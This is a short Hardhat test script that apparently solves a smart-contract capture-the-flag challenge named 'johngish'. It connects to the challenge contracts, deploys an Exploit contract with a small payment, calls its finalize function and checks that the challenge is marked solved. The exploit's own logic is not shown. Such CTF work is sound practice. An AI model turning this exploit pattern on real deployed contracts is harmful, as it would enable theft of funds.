import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { expect } from "chai";
import { SETUP_johngish, CHALLENGE_johngish} from "../../scripts/addresses"

let accounts: Signer[];
let attacker: Signer;
let attackerAddress: string;
let exploit: Contract;
let setup: Contract; 
let challenge: Contract;
let tx: any;

before(async () => {
    [attacker] = await ethers.getSigners();
    attackerAddress = await attacker.getAddress();
    setup = (await ethers.getContractAt(`contracts/johngish/Setup.sol:Setup`, SETUP_johngish)).connect(attacker);
    challenge = (await ethers.getContractAt(`contracts/johngish/Challenge.sol:Challenge`, CHALLENGE_johngish)).connect(attacker);
});

it("prints contract address", async function () {
    expect(await setup.instance()).to.eq(CHALLENGE_johngish);
});

it("info", async function () {
    console.log((await ethers.provider.getBalance(await challenge.address)).toString());
});

it("exploit", async () => {
    exploit = await (await ethers.getContractFactory(`contracts/johngish/Exploit.sol:Exploit`, attacker)).deploy(challenge.address, {value: 100});
    await exploit.finalize();

    console.log((await ethers.provider.getBalance(await challenge.address)).toString());
    expect(await setup.isSolved()).to.eq(true);
});